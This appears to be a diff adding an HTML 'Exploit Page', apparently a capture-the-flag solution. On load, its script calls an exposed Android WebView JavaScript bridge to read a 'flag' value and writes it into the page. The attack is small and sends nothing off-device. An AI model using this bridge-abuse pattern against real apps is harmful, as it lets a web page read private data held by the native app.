@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Exploit Page</title>
+</head>
+<body>
+  <script>
+
+    function exploit() {
+      try {
+        // Get the flag, strip off the timestamp, and replace the whole page with it
+        const flag = Android.getdate("flag").split("||")[0];
+        document.body.innerText = flag;
+      } catch (e) {
+        document.body.innerText = "Error";
+        console.log(e);
+      }
+    }
+
+    window.onload = exploit;
+
+  </script>
+</body>
+</html>
